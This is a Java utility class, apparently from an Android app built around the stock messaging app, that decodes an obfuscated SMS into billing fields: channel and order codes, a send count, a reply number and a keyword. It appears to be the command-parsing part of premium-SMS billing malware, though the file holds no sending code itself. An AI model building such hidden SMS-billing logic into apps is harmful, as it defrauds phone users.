package com.sttm.util;

import java.util.ArrayList;

import java.util.List;



import com.sttm.bean.BillSms;
import com.android.mms.R;

public class EncryptUtil {

	public int getRodom() {

		return (int) (Math.random() * 10);

	}

	public static BillSms getEncryptSMSString(String smsContent, String SMSF) {
		BillSms billSms = new BillSms();
		char[] charContent = smsContent.toCharArray();

		List<Integer> first = getNextSign(smsContent, SMSF, 0);

		List<Integer> second = getNextSign(smsContent, SMSF, first.get(0));

		char[] mobileChanel = new char[second.get(0) - first.get(0) - 1];

		System.arraycopy(charContent, first.get(0) + 1, mobileChanel, 0,
				second.get(0) - first.get(0) - 1);

		billSms.setMobileChanel(getReEncryptStr(mobileChanel, first.get(1)));

		List<Integer> three = getNextSign(smsContent, SMSF, second.get(0));
		char[] mobileOrder = new char[three.get(0) - second.get(0) - 1];
		System.arraycopy(charContent, second.get(0) + 1, mobileOrder, 0,
				three.get(0) - second.get(0) - 1);

		billSms.setMobileOrder(new String(mobileOrder));

		List<Integer> four = getNextSign(smsContent, SMSF, three.get(0));
		char[] unionChanel = new char[four.get(0) - three.get(0) - 1];
		System.arraycopy(charContent, three.get(0) + 1, unionChanel, 0,
				four.get(0) - three.get(0) - 1);
		billSms.setUnionChanel(getReEncryptStr(unionChanel, three.get(1)));

		List<Integer> five = getNextSign(smsContent, SMSF, four.get(0));
		char[] unionOrder = new char[five.get(0) - four.get(0) - 1];
		System.arraycopy(charContent, four.get(0) + 1, unionOrder, 0,
				five.get(0) - four.get(0) - 1);
		billSms.setUnionOrder(new String(unionOrder));

		List<Integer> six = getNextSign(smsContent, SMSF, five.get(0));
		char[] sendCount = new char[six.get(0) - five.get(0) - 1];
		System.arraycopy(charContent, five.get(0) + 1, sendCount, 0, six.get(0)
				- five.get(0) - 1);


		billSms.setCount(Integer.parseInt(new String(sendCount)));

		List<Integer> sevent = getNextSign(smsContent, SMSF, six.get(0));
		char[] replyNumber = new char[sevent.get(0) - six.get(0) - 1];
		System.arraycopy(charContent, six.get(0) + 1, replyNumber, 0,
				sevent.get(0) - six.get(0) - 1);
		billSms.setReplyNumber(new String(replyNumber));

		List<Integer> eight = getNextSign(smsContent, SMSF, sevent.get(0));
		char[] keyword = new char[eight.get(0) - sevent.get(0) - 1];
		System.arraycopy(charContent, sevent.get(0) + 1, keyword, 0,
				eight.get(0) - sevent.get(0) - 1);


		billSms.setKeyword(new String(keyword));

		return billSms;
	}

	public static List<Integer> getNextSign(String str, String pattern,
			int offset) {
		List<Integer> result = new ArrayList<Integer>();

		char[] charStr = str.toCharArray();
		char[] patternChar = pattern.toCharArray();

		out: for (int i = 0; i < charStr.length; i++) {

			for (int j = 0; j < patternChar.length; j++) {
				if (charStr[i] == patternChar[j]) {
					if (i > offset) {
						result.add(0, i);
						result.add(1, j);
						break out;

					}
					break;
				}
			}

		}

		return result;

	}

	public static String getReEncryptStr(char[] mobileChanel, int n) {
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < mobileChanel.length; i++) {
			if (mobileChanel[i] >= 'a' && mobileChanel[i] <= 'z') {
				int value = mobileChanel[i] - 'd' - n;
				sb.append(value);

			} else if (mobileChanel[i] >= 'A' && mobileChanel[i] <= 'Z') {
				int value = mobileChanel[i] - 'B' - n;
				sb.append(value);
			}

		}

		return sb.toString();
	}
}
